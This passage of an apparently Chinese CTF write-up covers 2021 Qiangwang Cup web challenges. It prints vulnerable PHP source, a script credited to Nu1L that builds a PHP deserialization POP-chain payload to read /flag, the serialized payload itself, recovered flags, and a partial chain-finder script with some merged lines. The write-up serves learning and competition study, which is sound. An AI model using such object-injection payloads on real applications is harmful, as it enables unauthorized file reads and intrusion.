string\">\'word/document.xml\'</span><span class=\"token punctuation\">)</span>\n	document<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n	tree <span class=\"token operator\">=</span> XML<span class=\"token punctuation\">(</span>xml_content<span class=\"token punctuation\">)</span>\n	\n	paragraphs <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n	<span class=\"token keyword\">for</span> paragraph <span class=\"token keyword\">in</span> tree<span class=\"token punctuation\">.</span>getiterator<span class=\"token punctuation\">(</span>PARA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n		texts <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>node<span class=\"token punctuation\">.</span>text\n				<span class=\"token keyword\">for</span> node <span class=\"token keyword\">in</span> paragraph<span class=\"token punctuation\">.</span>getiterator<span class=\"token punctuation\">(</span>TEXT<span class=\"token punctuation\">)</span>\n 				<span class=\"token keyword\">if</span> node<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">]</span>\n 		<span class=\"token keyword\">if</span> texts<span class=\"token punctuation\">:</span>\n			paragraphs<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">\'\'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>texts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n	<span class=\"token keyword\">return</span> <span class=\"token string\">\'\\n\\n\'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>paragraphs<span class=\"token punctuation\">)</span>\n \nfiles <span class=\"token operator\">=</span> glob<span class=\"token punctuation\">.</span>glob<span class=\"token punctuation\">(</span><span class=\"token string\">\'*/*/*.docx\'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> fname <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">.</span>tqdm<span class=\"token punctuation\">(</span>files<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n	res <span class=\"token operator\">=</span> get_docx_text<span class=\"token punctuation\">(</span>fname<span class=\"token punctuation\">)</span>\n	<span class=\"token keyword\">if</span> <span class=\"token string\">\'key2{\'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n		<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fname<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span>\n</code></pre> \n <ul>\n  <li><mark>KEY2{T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS}</mark></li>\n </ul> \n <p><strong>第六步，输入两个KEY值既可以获取最终的flag。</strong></p> \n <ul>\n  <li><mark>flag{798ef6da-41a9-4a14-a8a8-8b6351f3e162}</mark></li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615013610846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615022003583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <hr> \n <h1><a id=\"_345\"></a>三.[强网先锋]赌徒</h1> \n <h2><a id=\"1_347\"></a>1.题目描述</h2> \n <p>题目描述如下：</p> \n <ul>\n  <li>共499支队伍攻克，最后分值20pt</li>\n </ul> \n <p>该网站打开如下图所示：</p> \n <ul>\n  <li>I think you need /etc/hint . Before this you need to see the source code</li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/2021061502281792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <blockquote> \n  <p>该题目未做出来真的该打，一方面自己对反序列化还是不够深入，另一方面还是自己太菜，后面做50道反序列化题目，然后写篇博客总结吧！</p> \n </blockquote> \n <h2><a id=\"2_359\"></a>2.解题思路</h2> \n <p><strong>第一步，结合题目源码提醒，利用dirsearch扫描目录，发现 <code>www.zip</code> 文件。</strong></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615023146373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"500\" height=\"280\"></p> \n <p><strong>第二步，该压缩包解压为一个index.php源文件，核心思想是bypass反序列化然后执行hint.php得到flag。</strong></p> \n <ul>\n  <li>unserialize会执行wakeup，需要绕过</li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615023244362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"550\" height=\"350\"></p> \n <p><strong>index.php</strong></p> \n <pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span>meta charset<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf-8\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token comment\">//hint is in hint.php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Start</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">\'guest\'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">\'syst3m(\"cat 127.0.0.1/etc/hint\");\'</span><span class=\"token punctuation\">;</span>\n	\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"I think you need /etc/hint . Before this you need to see the source code\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">_sayhello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string single-quoted-string\">\'ok\'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hi\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">_sayhello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"give you flag : \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">flag</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Info</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$phonenumber</span><span class=\"token operator\">=</span><span class=\"token number\">123123</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$promise</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">\'I do\'</span><span class=\"token punctuation\">;</span>\n	\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">promise</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">\'I will not !!!!\'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">promise</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'filename\'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">ffiillee</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'ffiilleennaammee\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Room</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">\'/flag\'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sth_to_set</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">\'\'</span><span class=\"token punctuation\">;</span>\n	\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n	\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">Get_hint</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token variable\">$hint</span><span class=\"token operator\">=</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$hint</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">Get_hint</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'hello\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'hello\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token variable\">$hi</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span>  <span class=\"token class-name\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre> \n <p><strong>第三步，构造序列化代码生成payload，这里引用Nu1L的代码。</strong></p> \n <p>dt-wp.php</p> \n <pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n	<span class=\"token keyword\">class</span> <span class=\"token class-name\">Start</span>\n	<span class=\"token punctuation\">{\n    <!-- --></span>\n	 	<span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n	 	<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n	 		<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token operator\">=</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n	 	<span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n	<span class=\"token keyword\">class</span> <span class=\"token class-name\">Info</span>\n	<span class=\"token punctuation\">{\n    <!-- --></span>\n	 	<span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n		<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n			<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'filename\'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n	<span class=\"token keyword\">class</span> <span class=\"token class-name\">Room</span>\n	<span class=\"token punctuation\">{\n    <!-- --></span>\n		 <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">;</span>\n		 <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n		 <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		 	<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">filename</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">;</span>\n		 <span class=\"token punctuation\">}</span>\n		 <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n		 	<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Room</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		 <span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n	<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Room</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token variable\">$a</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Start</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre> \n <p>生成的结果如下图所示，通过该构造即可获取flag。</p> \n <pre><code class=\"prism language-php\"><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Start\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Info\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">a</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"filename\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Room\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"filename\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Room\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"filename\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">N</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615023513640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <p><mark>PS：由于太菜，还需要消化一段时间，后续作者会深入分析…</mark></p> \n <ul>\n  <li><a href=\"https://www.freebuf.com/news/172507.html\">从一道CTF题学习PHP反序列化漏洞 - freebuf</a></li>\n  <li><a href=\"https://blog.csdn.net/qq_39629343/article/details/80487781\">记一道CTF反序列化 - CSDN</a></li>\n  <li><a href=\"https://blog.csdn.net/weixin_43415644/article/details/94590443\">PHP反序列化漏洞总结 - CSDN</a></li>\n </ul> \n <hr> \n <h1><a id=\"pop_master_506\"></a>四.pop_master</h1> \n <h2><a id=\"1_508\"></a>1.题目描述</h2> \n <p>题目描述如下：</p> \n <ul>\n  <li>共188支队伍攻克，最后分值49pt</li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615023853360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"400\" height=\"280\"></p> \n <p>该网站打开如下图所示：</p> \n <pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"class.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//class.php.txt</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'pop\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'argv\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$class</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">nZepGo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615023926320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <blockquote> \n  <p>这道题目据说非常有意思，坐等官网和更多大佬的WP。看到官方bibi大神了~<br><br> <img src=\"https://img-blog.csdnimg.cn/20210615024801868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"500\" height=\"150\"></p> \n </blockquote> \n <blockquote></blockquote> \n <h2><a id=\"2_537\"></a>2.解题思路</h2> \n <p>这里仅放个Nu1L大佬的WP。</p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">from</span> phply <span class=\"token keyword\">import</span> phplex\n<span class=\"token keyword\">from</span> phply<span class=\"token punctuation\">.</span>phpparse <span class=\"token keyword\">import</span> make_parser\n<span class=\"token keyword\">from</span> phply<span class=\"token punctuation\">.</span>phpast <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> pprint\n<span class=\"token keyword\">import</span> nose\n\nparser <span class=\"token operator\">=</span> make_parser<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nfunc_name <span class=\"token operator\">=</span> <span class=\"token string\">\"find your func\"</span>\ncon <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./qwb/class.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nlexer <span class=\"token operator\">=</span> phplex<span class=\"token punctuation\">.</span>lexer<span class=\"token punctuation\">.</span>clone<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nlexer<span class=\"token punctuation\">.</span>filename <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\noutput <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">(</span>con<span class=\"token punctuation\">,</span> lexer<span class=\"token operator\">=</span>lexer<span class=\"token punctuation\">)</span>\nfunctions <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token punctuation\">}</span>\ntarget <span class=\"token operator\">=</span> functions<span class=\"token punctuation\">[</span>func_name<span class=\"token punctuation\">]</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token comment\"># 强赋值函数直接跳过</span>\nskip_func <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\npop_chain <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\npop_chain<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>func_name<span class=\"token punctuation\">)</span> e <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\n<span class=\"token keyword\">for</span> out <span class=\"token keyword\">in</span> output<span class=\"token punctuation\">:</span>\n	class_name <span class=\"token operator\">=</span> out<span class=\"token punctuation\">.</span>name\n	<span class=\"token keyword\">for</span> node <span class=\"token keyword\">in</span> out<span class=\"token punctuation\">.</span>nodes<span class=\"token punctuation\">:</span>\n		<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> Method<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n			functions<span class=\"token punctuation\">[</span>node<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> out\n<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>e <span class=\"token keyword\">is</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n	<span class=\"token keyword\">for</span> node <span class=\"token keyword\">in</span> target<span class=\"token punctuation\">.</span>nodes<span class=\"token punctuation\">:</span>\n		<span class=\"token 